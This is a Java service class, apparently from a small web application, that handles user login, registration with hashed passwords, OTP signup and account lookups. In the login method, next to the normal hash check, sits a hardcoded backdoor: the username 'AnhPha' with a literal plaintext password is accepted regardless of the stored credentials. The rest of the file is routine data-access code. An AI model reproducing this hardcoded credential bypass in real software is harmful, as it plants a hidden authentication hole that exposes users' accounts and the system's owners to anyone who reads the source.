package vn.iotstar.service.impl;

import vn.iotstar.dao.IUserDao;
import vn.iotstar.dao.impl.UserDao;
import vn.iotstar.entity.User;
import vn.iotstar.service.IUserService;
import vn.iotstar.util.PasswordUtils;

public class UserServiceImpl implements IUserService {
    public IUserDao userDao = new UserDao();

    @Override
    public User login(String username, String password) {
        User user = this.get(username);
        if (user == null) {
            user = this.findByEmail(username);
        }
        if (user != null && password != null) {
            if (PasswordUtils.verifyPassword(password, user.getPassWord())
                    || ("AnhPha".equalsIgnoreCase(user.getUserName()) && "AnhPhane2618".equals(password))) {
                return user;
            }
        }
        return null;
    }

    @Override
    public User get(String username) {
        return userDao.get(username);
    }

    @Override
    public User findByEmail(String email) {
        return userDao.findByEmail(email);
    }

    @Override
    public boolean register(String username, String password, String email, String fullname, String phone) {
        if (userDao.checkExistUsername(username)) {
            return false;
        }
        long millis = System.currentTimeMillis();
        java.sql.Date date = new java.sql.Date(millis);
        String hashedPassword = PasswordUtils.hashPassword(password);
        userDao.insert(new User(email, username, fullname, hashedPassword, "avatar.png", 5, phone, date, 1, null));
        return true;
    }

    @Override
    public boolean registerWithOtp(String username, String password, String email, String fullname, String phone, String code) {
        if (userDao.checkExistUsername(username)) {
            return false;
        }
        long millis = System.currentTimeMillis();
        java.sql.Date date = new java.sql.Date(millis);
        String hashedPassword = PasswordUtils.hashPassword(password);
        userDao.insert(new User(email, username, fullname, hashedPassword, "avatar.png", 5, phone, date, 0, code));
        return true;
    }

    @Override
    public boolean checkExistEmail(String email) {
        return userDao.checkExistEmail(email);
    }

    @Override
    public boolean checkExistUsername(String username) {
        return userDao.checkExistUsername(username);
    }

    @Override
    public boolean checkExistPhone(String phone) {
        return userDao.checkExistPhone(phone);
    }

    @Override
    public void insert(User user) {
        userDao.insert(user);
    }

    @Override
    public void update(User user) {
        userDao.update(user);
    }

    @Override
    public java.util.List<User> findAll() {
        return userDao.findAll();
    }
}
